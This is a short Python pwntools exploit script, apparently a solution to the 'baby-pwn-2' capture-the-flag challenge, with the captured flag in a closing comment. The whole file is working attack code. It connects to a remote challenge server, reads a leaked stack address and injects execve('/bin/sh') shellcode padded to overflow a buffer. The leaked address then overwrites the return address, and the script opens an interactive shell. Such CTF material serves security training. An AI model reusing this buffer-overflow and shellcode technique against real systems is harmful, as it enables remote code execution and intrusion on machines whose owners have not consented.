#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./baby-pwn-2", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b vulnerable_function")
p = remote("34.162.119.16", 5000)

p.readuntil(b"leak: ")
leak = int(p.readline().decode(), 16)

shellcode = asm("""
    mov rdi, 0x404008
    mov byte ptr [rdi], 0
    mov rbx, 0x68732f2f6e69622f
    mov rdi, 0x404000
    mov [rdi], rbx
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 59
    syscall
        """)

payload = shellcode.ljust(0x48, b"A")
payload += p64(leak)
p.sendlineafter(b"text: ", payload)

p.interactive() # uoftctf{sh3llc0d3_1s_pr3tty_c00l}
